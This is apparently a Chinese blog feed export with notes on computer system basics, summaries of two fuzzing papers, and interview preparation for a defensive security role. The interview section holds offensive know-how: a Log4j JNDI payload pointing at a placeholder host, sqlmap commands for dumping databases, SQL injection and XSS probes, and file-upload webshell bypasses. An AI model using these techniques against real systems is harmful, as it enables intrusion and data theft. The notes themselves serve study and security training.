<p>​	多核处理器就是把多个CPU（几核就是有几个CPU）集成在一个集成电路芯片上。如下图所示，微处理器芯片有4个CPU核，每个核都有自己的L1和L2高速缓存，其中L1高速缓存分为两个部分——一个保存<strong>最近取到的指令</strong>，另一个存放数据。</p>
<p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202112291413759.png"></p>
<p>超线程：同时多线程，允许<strong>一个CPU执行多个控制流</strong>。举例来说，Intel Core i7处理器可以让每个核执行两个线程，所以1个4核的系统实际上可以并行执行8个线程。</p>
<h4 id="指令级并行"><a href="#指令级并行" class="headerlink" title="指令级并行"></a>指令级并行</h4><p>​	处理器可以执行多条指令的属性成为指令级并行。如果一个处理器可以达到比一个周期一条指令更快的执行速率，就称之为<strong>超标量处理器</strong>，大多数现代处理器都支持这种操作。 </p>
<h4 id="单指令、多数据并行"><a href="#单指令、多数据并行" class="headerlink" title="单指令、多数据并行"></a>单指令、多数据并行</h4><p>​	SIMD，也即允许一条指令产生多个可以并行执行的操作。例如，最新处理器都具有并行的对8对单精度浮点数做加法的指令。</p>
<p>​	提供这些SIMD指令多是为了提高处理影像、声音和视频数据应用的执行速度。</p>
<h3 id="计算机系统中抽象的重要性"><a href="#计算机系统中抽象的重要性" class="headerlink" title="计算机系统中抽象的重要性"></a>计算机系统中抽象的重要性</h3><p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202112291424053.png"></p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>计算机操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解计算机系统(二)——信息的表示和处理</title>
    <url>/2022/01/04/04-%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F(%E4%BA%8C)/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​	当构造存储和处理信息的机器时，二进制工作得更好，因为二值信号进行存储和执行计算的电子电路非常简单可靠。 </p>
<p>​	本章研究在计算机上如何表示数字和其他形式数据的基本属性，以及计算机对这些数据执行操作的属性，例如编码等。</p>
<h1 id="信息存储"><a href="#信息存储" class="headerlink" title="信息存储"></a>信息存储</h1><p>​	大多数计算机使用8位的块（字节byte）作为<strong>最小</strong>的可寻址的内存单位，而不是访问内存中单独的<strong>位</strong>。</p>
<p>​	机器级程序将内存视为一个非常大的字节数组，称为虚拟内存（virtual memory）。内存的每个字节都由一个唯一的数字标识，即为它的地址（address），所有可能的地址集合就组成了<strong>虚拟地址空间</strong>（virtual address space）。</p>
<h2 id="十六进制表示法"><a href="#十六进制表示法" class="headerlink" title="十六进制表示法"></a>十六进制表示法</h2><p>太基础，不记录</p>
<p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202201041721170.png" alt="image-20220104172145064"></p>
<span id="more"></span>

<h2 id="字数据大小"><a href="#字数据大小" class="headerlink" title="字数据大小"></a>字数据大小</h2><p>​	字长（word size）指定指针数据的标称大小（normal size）。字长决定的最重要的系统参数就是<strong>虚拟地址空间的最大大小</strong>，因为虚拟地址是以这样的一个字来编码的。对于一个字长为w位的机器而言，虚拟地址的范围是0~2^w-1，程序最多访问2^w个字节。</p>
<p><img src="https://github.com/Cloudyunn/img/master/note/image-20220221140655942.png" alt="图2-3"></p>
<p>​	图2-3展示了为C语言各种数据类型分配的字节数。其还展示了指针使用程序的全字长。大部分数据类型都编码为有符号数值，除非有前缀关键字unsigned或对确定大小的数据类型使用了特定的无符号声明。数据类型char例外，因为大多数情况下，程序行为对数据类型char是有符号还是无符号的不敏感。</p>
<h2 id="寻址和字节顺序"><a href="#寻址和字节顺序" class="headerlink" title="寻址和字节顺序"></a>寻址和字节顺序</h2><p>​	对于程序对象，最重要的两个规则：<strong>这个对象的地址是什么？在内存中如何排列这些字节（大端序、小端序）？</strong></p>
<p>​	一般多字节对象都被存储为连续的字节序列，对象地址为其中所使用字节中最小的地址。例如一个int类型的变量x地址为0x100，也代表x的4个字节将被存储在0x100、0x101、0x102、0x103。</p>
<p>​	<strong>小端序</strong>——在内存中按照从<strong>最低</strong>有效字节到<strong>最高</strong>有效字节的顺序存储对象。</p>
<p>​	<strong>大端序</strong>——在内存中按照从<strong>最高</strong>有效字节到<strong>最低</strong>有效字节的顺序存储对象。</p>
<p>​	假设变量x的类型为int，位于地址0x100处，其十六进制值为0x01234567。地址范围0x100~0x103的字节顺序取决于其是小端序还是大端序：</p>
<p><img src="https://github.com/Cloudyunn/img/master/note/image-20220221142355279.png"></p>
<p>​	大多数Intel兼容机都只用小端模式。许多移动电话的ARM微处理器，这些芯片上的两种最火的操作系统——Android、IOS只能运行于小端模式。</p>
<h2 id="表示字符串"><a href="#表示字符串" class="headerlink" title="表示字符串"></a>表示字符串</h2><p>​	C语言中字符串被编码为一个以null（值为0）字符结尾的字符数组。每个字都由某个标准编码来表示，最常见的是ASCII字符码。</p>
<p>​	ASCII字符集适合于编码英文文档，但是在表达希腊语、中文、俄语等语言的特殊字符却没有太多办法。因此后续又提出了很多方法对不同语言的文字进行编码。当前的Unicode标准字库包括将近100000个字符，支持很广泛的语言种类。</p>
<h2 id="表示代码"><a href="#表示代码" class="headerlink" title="表示代码"></a>表示代码</h2><p>​	对于下述C函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	当在不同机器上编译时，生成的机器代码如下所示：</p>
<p><img src="https://github.com/Cloudyunn/img/master/note/image-20220221145037043.png"></p>
<p>​	这说明：不同的机器类型使用不同且不兼容的指令和编码方式。相同的进程，在不同的操作系统上也有不同的编码规则，所以二进制代码是不兼容的，很少能在不同机器和操作系统组合之间移植。</p>
<p>​	这归根于，计算机系统的一个基本概念：从机器的角度看，程序仅仅只是<strong>字节序列</strong>。</p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>计算机操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title>Fuzzing论文阅读笔记(一)</title>
    <url>/2022/01/06/05-Fuzzing%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0(%E4%B8%80)%20/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​	之前从网上一个博主的博客里面看到有关论文阅读记录的博文，博主在看完每一篇论文后都会进行相关总结和思考记录。个人觉得这是个不错的习惯，遂学习了下，刚好对最近看的几篇论文进行简单的记录。</p>
<h1 id="论文总结"><a href="#论文总结" class="headerlink" title="论文总结"></a>论文总结</h1><h2 id="V-Shuttle"><a href="#V-Shuttle" class="headerlink" title="V-Shuttle"></a>V-Shuttle</h2><p><strong>论文地址</strong>：<a href="https://nesa.zju.edu.cn/download/pgn_pdf_V-SHUTTLE.pdf">V-Shuttle:Scalable and Semantics-Aware Hypervisor Virtual Device Fuzzing</a></p>
<p><strong>1、基本介绍</strong>：</p>
<p>​	这篇文章是<a href="https://www.zhihu.com/people/pan-mou-mou-86">潘神</a>在2021年CCS上发表的一篇fuzzing相关论文，论文拿了CCS2021年的best paper（国内唯一）。fuzzing对象是虚拟化技术的核心组件hypervisor（虚拟机管理程序）中的虚拟设备（virtual device），应该属于<strong>云计算安全</strong>、<strong>虚拟化技术</strong>、<strong>fuzzing</strong>、<strong>二进制漏洞挖掘与应用</strong>等相关领域。</p>
<p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202201061410551.png"></p>
<p><strong>2、大致内容</strong>：</p>
<p>​	传统使用随机输入、覆盖引导、结构感知的方法对hypervisor中大部分虚拟设备进行fuzzing，会存在<strong>效率低下、覆盖率低、可扩展性差</strong>等问题。本文研究了造成这些问题的核心在于：通过<a href="https://zhuanlan.zhihu.com/p/138573828"><strong>DMA</strong></a>传输的数据结构具有<strong>高度嵌套特性</strong>。后续作者通过对qemu的hypervisor中与DMA操作相关的api进行hook，将对虚拟机用户内存数据的读取<strong>重定向</strong>到了fuzzer的testcase中，以此来解决传统fuzzing突变指针字段会导致<strong>无效内存访问</strong>的问题。在前面基础上，作者再通过数据流分析方法（活变量）对每种类型DMA对象的数据结构进行标记、分组构建种子池（seedpool），实现了语义感知的功能，来引导fuzzing过程中testcase的构建。</p>
<span id="more"></span>

<p><strong>3、结论</strong>：</p>
<p>​	作者提出的对hypervisor中虚拟设备可扩展和语义感知的fuzzing框架，相较于之前的研究来说：</p>
<ul>
<li>有了更好的自动化能力：无需先验知识、整个过程无需人工驱动</li>
<li>更强的可扩展性：对不同平台、多个虚拟设备的fuzz都有很好的覆盖率（virtual box上的虚拟设备似乎没有展示，有代考究）</li>
<li>更优秀的漏洞挖掘能力：挖出了之前没有的35个bug、17个被授权为CVE，甚至包含了black hat上公布的一个<strong>虚拟机逃逸</strong>。（先膜拜一波）</li>
</ul>
<p><strong>4、思考</strong>：</p>
<p>​	文章中提到该框架的相关问题主要有：要求目标设备代码开源，因为需要进行相关hook操作（这个应该不是问题，只要得到官方授权应该可以弄到源码）、不能自动恢复POC，因为fuzzing引擎是集成在hypervisor主机进程中（有点没弄懂，是需要手动构建漏洞利用脚本的意思？）、对hypervisor内部状态的细粒度感知不够（v-shuttle的工作过程中，目标系统内部状态一直存在，但相同输入在不同的内部状态下可能执行不同的代码路径）。</p>
<p>​	个人觉得这篇文章的亮点主要在于：</p>
<ul>
<li>对虚拟化技术底层的研究比较深入（包括DMA、MIMO等机制）</li>
<li>论文的产出确实丰厚：35个之前没有发现的bug，17个CVE，1个虚拟机逃逸（这个成绩属实很好了）</li>
<li>云计算安全的背景加分：现在云计算相关应用太火了，这方面的安全问题确实影响太大。</li>
</ul>
<h2 id="ICS3Fuzzer"><a href="#ICS3Fuzzer" class="headerlink" title="ICS3Fuzzer"></a>ICS3Fuzzer</h2><p><strong>论文地址</strong>：<a href="https://dl.acm.org/doi/pdf/10.1145/3485832.3488028">ICS3Fuzzer: A Framework for Discovering Protocol Implementation Bugs in ICS Supervisory Software by Fuzzing</a></p>
<p><strong>1、基本介绍</strong></p>
<p>​	这篇论文是中科院信工所<a href="http://people.ucas.edu.cn/~0002848">孙利民老师</a>指导的一篇fuzzing论文。fuzzing对象是ICS（工业控制系统）中的<strong>监控软件</strong>（也就是常见的上位机软件这些），应该属于<strong>工控安全</strong>领域。</p>
<p><strong>2、大致内容</strong>	</p>
<p>​	监控软件广泛用于ICS中，可被滥用来恶意控制或操纵物理设备（PLC等），危机生产过程甚至人类生命。本论文提出了一个<strong>可移植化、模块化</strong>的模糊框架来自动发现<strong>监控软件和现场设备之间</strong>通信协议中的bug。针对协议逆向需要大量人工工作的问题，该方法通过GUI操作和网络通信的同步控制，实现了整个监控软件的运行和模糊测试，避免了对协议实现模块的分析和提取。基于监控软件的执行轨迹和相应输入，构造一个状态记录本，同时提出一种状态选择算法来找出更容易出现bug的协议状态，进而为fuzzer分配更多这些状态的输入。</p>
<p><strong>3、存在的挑战性</strong></p>
<ul>
<li>引导监控软件进入特定的输入状态是有挑战性的，因为监控软件中每个会话涉及多个输入状态。<ul>
<li>例如TCP三次交互都是由客户端角色（监控软件）发起的，所以fuzzer智能被动等待，指导接收到监控软件的会话请求。</li>
<li>其次每次模糊测试一个输入状态，多要一次又一次触发监控软件进入正确交互状态。</li>
<li>最后由于输入状态之间复杂的依赖关系，很多情况下监控软件不先输入其他状态就不能直接输入一个输入状态。</li>
<li>最糟糕的是——基于流量识别一组完整的会话状态本身就很难（因为缺乏私有协议知识）</li>
</ul>
</li>
<li>几乎所有监控软件使用的都是私有协议来和PLC通信，所以具有未知的状态空间（输入状态）和格式——不可能探索深层路径和协议状态。</li>
<li>在进入特定的输入状态之前，监控软件发送的每个请求都必须正确响应（状态机要满足，然而缺乏该方面的知识）</li>
</ul>
<p><strong>4、相关解决方法</strong></p>
<ul>
<li>对于C1，本文设计了一种新的控制机制，通过对GUI操作和网络通信的精确同步控制，实现进入任何识别的输入状态。</li>
<li>对于C2，采用现有的工作（Discover、Dispatcher、Netzob等）来自动化逆向工程协议的包帧格式，同时通过差分分析来识别字段、识别出会话ID、序列号等字段值约束。此外为了识别有价值的状态、过滤重复状态，作者避免了对详细的程序状态进行逆向工程，而是基于<strong>执行跟踪</strong>和<strong>相应的输入构建状态簿</strong>，同时在此基础上提出一种<strong>动态切换状态</strong>的模糊策略。</li>
<li>对于C3，根据实际捕获的流量构造了一组通信模板，模拟PLC设备的响应。对于管理软件的每个请求，首先在匹配的模板中识别相应的响应，然后自动调整对应的值约束（会话ID、序列号等），如果太复杂则直接使用真实PLC设备提供？</li>
</ul>
<p><strong>5、结论</strong></p>
<p>​	本文提出一个针对<strong>ICS监控软件</strong>的<strong>可定制、模块化</strong>的fuzzing框架，以支持不同监控软件协议实现方面的漏洞检测。给定监控软件的功能，作者可以构建一个<strong>通信模板</strong>来基于捕获的消息模拟会话，在网络和GUI行为自动同步的帮助下，ICS3 Fuzzer可以达到任何输入状态，并定向提供突变的输入，通过在4个不同的商业监控软件上实验，发现了13个漏洞。</p>
<p><strong>6、思考</strong></p>
<p>​	这篇文章的fuzzing对象是ICS系统的监控软件，通俗点理解应该就是PLC上位机软件。感觉一定程度上还是从流量的角度来对软件进行fuzzing，进而挖掘上位机软件的协议漏洞。整体的框架中，Fuzzer似乎就模拟成了一个虚拟PLC，作为为上位机提供响应的角色。感觉关键思想在于：通过捕获的流量包来制作字典，能匹配请求的响应就送出去，无法匹配（过于复杂）的复杂请求，就交给真实的PLC处理。这个思想和虚拟化工控蜜罐的思想好像差不多欸？然后在此基础上，动态选择感兴趣的状态（输入）来模糊测试软件？</p>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>Fuzzing</tag>
      </tags>
  </entry>
  <entry>
    <title>冬奥护网项目面试问题</title>
    <url>/2022/01/09/06-%E5%86%AC%E5%A5%A5%E6%8A%A4%E7%BD%91%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E5%87%86%E5%A4%87%20/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>准备提前记录一下冬奥护网行动面试可能会问的一些问题，以及对应的简要想法和答案</p>
<h2 id="先介绍下你的技术情况"><a href="#先介绍下你的技术情况" class="headerlink" title="先介绍下你的技术情况"></a>先介绍下你的技术情况</h2><p>​	熟练使用kali，包括但不仅限于以下工具：Metasploit、Nessus、burpsuite、nmap、sqlmap、beef等，还有些工具类似：Aircrack-ng（wifi网络监控、信息获取、破坏等功能）、hydra（协议爆破）了解基础使用用法。</p>
<p>​	熟悉owasp top10，熟悉DVWA靶场上相关漏洞的愿一力以及漏洞利用方式。熟悉一些简单的网站漏洞，原理查询以及利用。</p>
<h2 id="如果让你渗透一个网站，你的思路是什么？"><a href="#如果让你渗透一个网站，你的思路是什么？" class="headerlink" title="如果让你渗透一个网站，你的思路是什么？"></a>如果让你渗透一个网站，你的思路是什么？</h2><ul>
<li><p>1、前期交互：客户需求、测试计划、目标、范围、条件等等（回答可以略过）</p>
</li>
<li><p>2、信息收集</p>
<ul>
<li><p>（1）服务器相关信息（真实IP、系统类型、版本、开放端口、WAF等），个人一般用shodan看基本信息。</p>
</li>
<li><p>（2）网站指纹识别（cms、cdn证书等），dns记录</p>
</li>
<li><p>（3）whois信息，姓名、备案、邮箱、电话反差等，为后面社会工程学准备</p>
</li>
<li><p>（4）子域名收集（google hack的site）：旁站查询、C段等，先看看旁站有没有通用性的cms或者其他漏洞，主站一般比较难。</p>
<ul>
<li><blockquote>
<p>CMS使用判别：应用程序的文件中出现的特征码来快速识别是哪一个CMS，在进行漏洞查找利用。或者利用一些工具来扫，例如御剑WEB指纹识别工具、cmscan</p>
</blockquote>
</li>
</ul>
</li>
<li><p>（5）Google hack进一步探测网站的信息、后台、敏感文件</p>
<ul>
<li><blockquote>
<p>site:	指定域名</p>
<p>intext:	正文中关键字</p>
<p>intitle:	标题中关键字</p>
<p>info：	基本信息</p>
<p>inurl：	URL存在关键字</p>
<p>filetype：	指定文件类型</p>
</blockquote>
</li>
</ul>
</li>
<li><p>（6）扫网站目录结构、爆后台，网站banner、测试文件、备份等敏感文件泄露等，如php探针。</p>
<blockquote>
<ul>
<li>常用工具：御剑后台扫描工具、burp、dirbuster等</li>
</ul>
</blockquote>
</li>
<li><p>（7）传输协议，通用漏洞，exp</p>
</li>
<li><p>（8）查看IP、指定IP端口扫描、对响应端口进行漏洞探测、例如samba、mysql、ftp、ssh、心脏出血等。</p>
</li>
</ul>
</li>
<li><p>3、漏洞挖掘</p>
<ul>
<li>（1）浏览网站结构，了解规模、功能、特点</li>
<li>（2）端口、弱口令、目录扫描</li>
<li>（3）XSS、SQL、命令注入、CSRF、cookie安全检测、暴力破解、敏感信息、文件包含、任意文件上传、重放攻击等，个人习惯一般先针对特定特点手动尝试，再用Nessus等漏洞扫描工具。</li>
</ul>
</li>
<li><p>4、漏洞利用</p>
<ul>
<li>利用前面方式getshell、webshell或者其他权限后，<strong>权限提升</strong>。可以使用mysql、windows低版本漏洞、linux内核版本漏洞提权。</li>
</ul>
</li>
<li><p>5、清除测试数据、输出报告</p>
<ul>
<li>（1）日志、测试数据的清理</li>
<li>（2）总结，形成渗透测试报告、修复方案等。</li>
</ul>
</li>
</ul>
<span id="more"></span>


<h2 id="说一些近段时间你了解的漏洞"><a href="#说一些近段时间你了解的漏洞" class="headerlink" title="说一些近段时间你了解的漏洞"></a>说一些近段时间你了解的漏洞</h2><ul>
<li><p>1、2021.11.24阿里云安全团队披露的Apache Log4j2远程代码执行漏洞(RCE)</p>
<blockquote>
<p>Apache Log4j2是一款优秀的Java日志框架，广泛应用于<strong>中间件、开发框架与Web应用</strong>中，用来记录日志信息。由于其作为<strong>基础组件</strong>广泛应用于很多Java框架和项目中，影响了数以万计的应用，因此绝大多数使用Java项目的公司都会被波及。 </p>
<p>影响应用及组件：Apache Solr、Apache Struts2、Apache Flink、Apache Druid、spring-boot-strater-log4j2等等</p>
<p>由于Apache Log4j2某些功能存在递归解析功能，攻击者就可以直接构造恶意请求，触发远程代码执行漏洞，漏洞的poc已被公开，默认配置就可以进行利用（无需特殊环境）</p>
<p>原理：漏洞成因在于log4j2提供的<strong>lookup</strong>功能。日志中包含 ${}，lookup功能就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。其中的<strong>JNDI</strong>就是利用的主题，因为其解析未做限制，可以直接访问到远程对象，当记录日志的一部分是用户可控时，就可以构造恶意字符串使服务器记录日志时调用JNDI访问恶意对象，也就是流传出的payload构成：</p>
</blockquote>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap:xxx.xxx.xxx.xxx:xxxx/exp&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Cloudyunn/img/master/note/202201101050307.jpeg"></p>
<blockquote>
<p>攻击思路：</p>
<ul>
<li>（1）找到目标服务器记录日志的地方，且记录的部分内容可控</li>
<li>（2）搭建RMI服务器，包含需要执行的恶意代码</li>
<li>（3）构建EXP触发目标服务器进行日志记录触发JNDI解析</li>
<li>（4）解析结果定位到搭建的恶意服务端，目标服务器访问并触发恶意代码</li>
</ul>
</blockquote>
<h2 id="以前挖过哪些网站的漏洞"><a href="#以前挖过哪些网站的漏洞" class="headerlink" title="以前挖过哪些网站的漏洞"></a>以前挖过哪些网站的漏洞</h2><p>DVWA靶场几乎所有的漏洞、课题组网站的漏洞（sql注入）</p>
<h2 id="说几个你比较常用的工具"><a href="#说几个你比较常用的工具" class="headerlink" title="说几个你比较常用的工具"></a>说几个你比较常用的工具</h2><ul>
<li>nmap</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-sT							TCP connect扫描，最基本的方式，很容易被检测</span><br><span class="line">-sS							TCP SYN同步扫描，为半开扫描，很少有系统能记入日志。</span><br><span class="line">-sV							版本探测</span><br><span class="line">-sA							ACK扫描，通常可以穿过防火墙</span><br><span class="line">-sW							滑动窗口扫描，类似sA</span><br><span class="line">-sR							RPC扫描，和其他不同扫描方法结合使用</span><br><span class="line">-sM							TCP	Maimon扫描</span><br><span class="line"></span><br><span class="line">-p	20-30/139/60000			指定端口扫描</span><br><span class="line">-P-							扫描0-65535全部端口</span><br><span class="line">-P0							扫描之前不ping主机</span><br><span class="line">-Pn							选项指示NMAP跳过默认的发现检查并对执行对目标的完整端口扫描。当扫描被阻止ping探针的防火墙保护的主机时，这是非常有用的</span><br><span class="line">-n							禁用反向DNS解析</span><br></pre></td></tr></table></figure>

<ul>
<li>sqlmap</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap	-u	&quot;http://www.xx.com?id=x&quot;	查询是否有诸如点</span><br><span class="line">--dbs									检测站点包含哪些数据库</span><br><span class="line">--current-db							获取当前数据库名</span><br><span class="line">--tables -D “db_name”					获取指定数据库表名</span><br><span class="line">--columns  -T &quot;table_name&quot; -D &quot;db_name&quot;	获取数据库表中的字段</span><br><span class="line">--dump -C &quot;columns_name&quot; -T &quot;table_name&quot; -D &quot;db_name&quot;获取字段的数据内容</span><br><span class="line"></span><br><span class="line">--cookie &quot;cookie&quot; --level 2				coockie注入，后接coockie值</span><br><span class="line">--threads								线程，最高为10</span><br><span class="line"></span><br><span class="line">post注入：</span><br><span class="line">（1）目标地址http:// www.xxx.com /login.asp</span><br><span class="line">（2）打开burp代理。</span><br><span class="line">（3）点击表单提交</span><br><span class="line">（4）burp获取拦截信息（post）</span><br><span class="line">（5）右键保存文件（.txt）到指定目录下</span><br><span class="line">（6）运行sqlmap并执行如下命令：sqlmap -r okay.txt  -p  username</span><br></pre></td></tr></table></figure>

<h2 id="常见端口号及相关服务、漏洞"><a href="#常见端口号及相关服务、漏洞" class="headerlink" title="常见端口号及相关服务、漏洞"></a>常见端口号及相关服务、漏洞</h2><table>
<thead>
<tr>
<th>端口</th>
<th>服务</th>
<th>入侵方式</th>
</tr>
</thead>
<tbody><tr>
<td>21</td>
<td>ftp&#x2F;tftp&#x2F;vsftpd文件传输协议</td>
<td>爆破&#x2F;嗅探&#x2F;溢出&#x2F;后门——vsftpd漏洞</td>
</tr>
<tr>
<td><strong>22</strong></td>
<td>ssh远程连接</td>
<td>爆破&#x2F;openssh漏洞</td>
</tr>
<tr>
<td><strong>23</strong></td>
<td>Telnet远程连接</td>
<td>爆破&#x2F;嗅探&#x2F;弱口令</td>
</tr>
<tr>
<td>25</td>
<td>SMTP邮件服务</td>
<td>邮件伪造</td>
</tr>
<tr>
<td>53</td>
<td>DNS域名解析系统</td>
<td>域传送&#x2F;劫持&#x2F;缓存投毒&#x2F;欺骗</td>
</tr>
<tr>
<td>67&#x2F;68</td>
<td>dhcp服务</td>
<td>劫持&#x2F;欺骗</td>
</tr>
<tr>
<td>110</td>
<td>pop3</td>
<td>爆破&#x2F;嗅探</td>
</tr>
<tr>
<td><strong>139</strong></td>
<td>samba服务</td>
<td>爆破&#x2F;未授权访问&#x2F;RCE</td>
</tr>
<tr>
<td>161</td>
<td>SNMP协议</td>
<td>爆破&#x2F;搜集目标内网信息</td>
</tr>
<tr>
<td><strong>445</strong></td>
<td>smb，也是一种TCP端口，win低版本和139相同</td>
<td>ms17-010&#x2F;端口溢出</td>
</tr>
<tr>
<td>1080</td>
<td>socket</td>
<td>爆破</td>
</tr>
<tr>
<td>1443</td>
<td>SQLserver的默认端口</td>
<td>爆破&#x2F;注入&#x2F;SA弱口令</td>
</tr>
<tr>
<td>1521</td>
<td>oracle</td>
<td>爆破&#x2F;注入&#x2F;TNS爆破&#x2F;反弹shell</td>
</tr>
<tr>
<td>2375</td>
<td>docker remote api</td>
<td>未授权访问</td>
</tr>
<tr>
<td>3306</td>
<td>mysql的默认端口</td>
<td>爆破&#x2F;注入</td>
</tr>
<tr>
<td>3389</td>
<td>RDP远程桌面连接</td>
<td>爆破&#x2F;shift后门</td>
</tr>
<tr>
<td>7001</td>
<td>weblogic</td>
<td>java反序列化漏洞&#x2F;控制台弱口令</td>
</tr>
<tr>
<td>8080&#x2F;89</td>
<td>Jboss&#x2F;Tomcat&#x2F;Resin</td>
<td>爆破&#x2F;反序列化&#x2F;PUT文件上传</td>
</tr>
</tbody></table>
<h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><p>sql，Structured Query Language，叫做结构化查询语言，管理数据库时用到的一种语言。</p>
<p>SQL注入，即把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令，主要原因是程序没有细致地过滤用户地数据，致使非法数据侵入系统。</p>
<h2 id="反序列化漏洞原理"><a href="#反序列化漏洞原理" class="headerlink" title="反序列化漏洞原理"></a>反序列化漏洞原理</h2><p>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还 原成对象。如果Java（PHP）应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意 输入，让反序列化产生<strong>非预期的对象</strong>，非预期的对象在产生过程中就有可能带来任意代码执行</p>
<p>Java中：ObjectOutputStream类的writeObject()方法、ObjectInputStream类的readObject()方法</p>
<p>PHP中：serialize()和unserialize()两个函数</p>
<p>问题的根源在于类ObjectInputStream在反序列化时，没有<strong>对生成的对象的类型做限制</strong>；假若反序列化可以设置Java类型的白名单，则不会有如此大的影响。</p>
<h2 id="如何去测试SQL注入-x2F-反序列化-x2F-XSS-x2F-文件上传-x2F-越权漏洞"><a href="#如何去测试SQL注入-x2F-反序列化-x2F-XSS-x2F-文件上传-x2F-越权漏洞" class="headerlink" title="如何去测试SQL注入&#x2F;反序列化&#x2F;XSS&#x2F;文件上传&#x2F;越权漏洞"></a>如何去测试SQL注入&#x2F;反序列化&#x2F;XSS&#x2F;文件上传&#x2F;越权漏洞</h2><ul>
<li>SQL注入：</li>
</ul>
<p>通过查看回显，来判断能不能进行sql注入，是哪种sql注入：数字型？字符型？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and 1=1 返回成功</span><br><span class="line">?id=1 and 1=2 返回失败</span><br></pre></td></tr></table></figure>

<p>有回显则是数字型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and &#x27;1&#x27;=&#x27;1	返回成功</span><br><span class="line">?id=1&#x27; and &#x27;1&#x27;=&#x27;2	返回失败</span><br></pre></td></tr></table></figure>

<p>这就是字符型</p>
<blockquote>
<p>搜索<code>&#39;</code>，如果出错，说明90%存在这个漏洞</p>
<p>搜索<code>%</code>，如果正常返回，说明95%有洞了</p>
<p>搜索一个关键字，比如<code>test</code>，正常返回所有test相关的信息</p>
<p>再搜索<code>test%&#39;and 1=1 and &#39;%&#39;=&#39;</code>和<code>test%&#39;and 1=2 and &#39;%&#39;=&#39;</code></p>
</blockquote>
<p>常用：先用万能密码尝试下，类似’ or 1&#x3D;’1这种，先用order by猜列数，猜成功后爆数据库、数据表、列、数据等。</p>
<ul>
<li>反序列化：</li>
</ul>
<p>反序列化操作一般在导入模版文件、网络通信、数据传输、日志格式化存储、对象数据落磁 盘或DB存储等业务场景，在代码审计时可重点关注一些反序列化操作函数并判断输入是否可控</p>
<ul>
<li>XSS：</li>
</ul>
<p>在网站输入框，通过script,img,body等标签，能够插入js语句，表示存在漏洞，比如说alert</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>文件上传漏洞：</li>
</ul>
<p>简单的过滤可能在前端，在上传文件的后利用burp拦截，然后将文件后缀名改为.php，如果上传成功，证明存在漏洞 将一句话木马植入图片文件中，上传，成功则存在。</p>
<ul>
<li>越权漏洞：</li>
</ul>
<p>通过正确的账号密码登录，利用burp拦截请求包，发送到repeater里，修改里面的关于id的 内容，根据返回值判断是否获得其他账户信息</p>
<h2 id="文件上传漏洞的绕过方法有哪些"><a href="#文件上传漏洞的绕过方法有哪些" class="headerlink" title="文件上传漏洞的绕过方法有哪些"></a>文件上传漏洞的绕过方法有哪些</h2><p>在文件名后面加上满足上传文件需求的后缀名 上传文件时使用burp拦截，在前端上传成功后在burp里将文件名后缀修改成.php 将一句话木马插入到需要上传的文件中。</p>
<h2 id="SQL注入漏洞有哪些利用手法"><a href="#SQL注入漏洞有哪些利用手法" class="headerlink" title="SQL注入漏洞有哪些利用手法"></a>SQL注入漏洞有哪些利用手法</h2><p>联合查询（union select）</p>
<p>报错注入：注入特殊的语句使报错回显中带上我们需要的信息，常见的报错回显有三种函数extractvalue()、update<a href="https://so.csdn.net/so/search?q=xml">xml</a>()、floor()。</p>
<p>布尔盲注：将我们要获取的信息与猜测信息进行比对，正确页面正常，错误时与正确页面有区别。在布尔盲注时我们通常会使用到length()、substr()、ascll()。</p>
<p>延时注入（sleep、if）：注入延时回显参数，根据是否延时来判断语句执行是否正确</p>
<h2 id="比较喜欢用哪几种工具，它们的优势是什么"><a href="#比较喜欢用哪几种工具，它们的优势是什么" class="headerlink" title="比较喜欢用哪几种工具，它们的优势是什么"></a>比较喜欢用哪几种工具，它们的优势是什么</h2><ul>
<li>burpsuite：功能强大，可以实现拦截，代理，爆破等功能，还可以加载各种插件</li>
<li>nmap：方便的查询接口及其状态</li>
<li>sqlmap：使用比较方便，可以轻松实现sql盲注。有自带的tamper，但有的时候需要手动编写来绕过一些过滤。</li>
</ul>
